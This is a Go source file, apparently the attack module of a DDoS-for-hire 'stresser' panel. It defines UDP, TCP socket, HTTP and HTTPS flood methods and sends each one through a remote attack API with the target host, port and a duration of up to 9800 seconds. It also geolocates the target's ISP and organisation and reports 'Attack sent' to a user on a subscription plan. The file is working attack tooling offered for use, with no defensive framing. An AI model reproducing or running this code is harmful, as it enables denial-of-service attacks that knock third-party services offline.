package main

import (
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"strings"

	"github.com/mattn/go-shellwords"
)

type MethodInfo struct {
	methodId     uint8
	methodApi    string
	methodName   string
	description  string
	layer7Method bool
}

type Attack struct {
	Duration uint32
	Type     uint8
	Target   string
	Port     string
	Method   string
	User     string
}

const APIKey = "key"

var methodInfoLookup map[string]MethodInfo = map[string]MethodInfo{
	"udp": MethodInfo{
		0,
		"https://api.net/api.php?key=" + APIKey + "&host=[host]&port=[port]&time=[time]&method=UDP",
		"udp",
		"Simple UDP flood.",
		false,
	},
	"socket": MethodInfo{
		1,
		"https://api.net/api.php?key=" + APIKey + "&host=[host]&port=[port]&time=[time]&method=SOCKET",
		"socket",
		"TCP SOCKET flood.",
		false,
	},
	"get": MethodInfo{
		2,
		"https://api.net/api.php?key=" + APIKey + "&host=[host]&port=[port]&time=[time]&method=GET",
		"get",
		"Simple httpget method (TLS).",
		true,
	},
	"http": MethodInfo{
		3,
		"https://api.net/api.php?key=" + APIKey + "&host=[host]&port=[port]&time=[time]&method=HTTP",
		"http",
		"HTTP flood.",
		true,
	},
	"https": MethodInfo{
		4,
		"https://api.net/api.php?key=" + APIKey + "&host=[host]&port=[port]&time=[time]&method=HTTPS",
		"https",
		"HTTPS flood.",
		true,
	},
}

type GeoInfo struct {
	ISP     string
	Org     string
	Country string
}

func lookupGeo(host string) GeoInfo {
	h := host
	if strings.Contains(h, "://") {
		parts := strings.SplitN(h, "://", 2)
		h = parts[1]
	}
	if strings.Contains(h, "/") {
		h = strings.Split(h, "/")[0]
	}
	if strings.Contains(h, ":") {
		h = strings.Split(h, ":")[0]
	}

	client := &http.Client{}
	resp, err := client.Get("http://ip-api.com/json/" + h + "?fields=status,isp,org,country")
	if err != nil {
		return GeoInfo{}
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	var raw struct {
		Status  string `json:"status"`
		ISP     string `json:"isp"`
		Org     string `json:"org"`
		Country string `json:"country"`
	}
	if err := json.Unmarshal(body, &raw); err != nil || raw.Status != "success" {
		return GeoInfo{}
	}
	return GeoInfo{ISP: raw.ISP, Org: raw.Org, Country: raw.Country}
}

func uint8InSlice(a uint8, list []uint8) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func NewAttack(str string) (*Attack, error) {
	atk := &Attack{0, 0, str, "", "", ""}
	args, _ := shellwords.Parse(str)

	var atkInfo MethodInfo
	if len(args) == 0 {
		return nil, errors.New("must specify an attack name")
	}

	var exists bool
	atkInfo, exists = methodInfoLookup[args[0]]
	if !exists {
		return nil, errors.New(fmt.Sprintf("\u001B[97mCommand not found"))
	}
	atk.Type = atkInfo.methodId
	atk.Method = atkInfo.methodName
	args = args[1:]

	if len(args) == 0 {
		return nil, errors.New("\033[91mError! \033[97mYou need to specify a target")
	}
	atk.Target = args[0]
	args = args[1:]

	if len(args) == 0 {
		return nil, errors.New("\u001B[91mError! \u001B[97mYou need to specify a port")
	}
	atk.Port = args[0]
	args = args[1:]

	if len(args) == 0 {
		return nil, errors.New("\033[91mError! \033[97mMust specify an attack duration")
	}
	duration, err := strconv.Atoi(args[0])
	if err != nil || duration == 0 || duration > 9800 {
		return nil, errors.New(fmt.Sprintf("\033[91mError! \033[97mInvalid attack duration, near %s. Duration must be between 0 and 9800 seconds", args[0]))
	}
	atk.Duration = uint32(duration)

	return atk, nil
}

func (this *Attack) Build(plan string) (string, bool, error) {
	info, ok := methodInfoLookup[this.Method]
	if !ok {
		return "", false, errors.New("unknown method")
	}

	url := info.methodApi
	url = strings.ReplaceAll(url, "[host]", this.Target)
	url = strings.ReplaceAll(url, "[port]", this.Port)
	url = strings.ReplaceAll(url, "[time]", strconv.Itoa(int(this.Duration)))

	client := &http.Client{}
	resp, err := client.Get(url)
	if err != nil {
		return "", false, err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := strings.ToLower(string(body))

	success := resp.StatusCode == 200
	for _, bad := range []string{"error", "failed", "invalid", "denied", "not found"} {
		if strings.Contains(bodyStr, bad) {
			success = false
			break
		}
	}

	geo := lookupGeo(this.Target)

	statusCol := "\033[92m"
	statusText := "successfully"
	if !success {
		statusCol = "\033[91m"
		statusText = "failed"
	}

	var out strings.Builder
	out.WriteString("\r\n")
	out.WriteString("\033[97mAttack sent \033[0m" + statusCol + statusText + "\033[0m\r\n")
	out.WriteString("\r\n")
	out.WriteString("\033[90m[ISP]\033[0m      \033[97m" + fallback(geo.ISP) + "\033[0m\r\n")
	out.WriteString("\033[90m[ORG]\033[0m      \033[97m" + fallback(geo.Org) + "\033[0m\r\n")
	out.WriteString("\033[90m[Country]\033[0m  \033[97m" + fallback(geo.Country) + "\033[0m\r\n")
	out.WriteString("\033[90m[Time]\033[0m     \033[97m" + strconv.Itoa(int(this.Duration)) + "s\033[0m\r\n")
	out.WriteString("\033[90m[User]\033[0m     \033[97m" + this.User + "\033[0m\r\n")
	out.WriteString("\033[90m[Plan]\033[0m     \033[97m" + plan + "\033[0m\r\n")
	out.WriteString("\r\n")

	return out.String(), success, nil
}

func fallback(s string) string {
	if s == "" {
		return "Unknown"
	}
	return s
}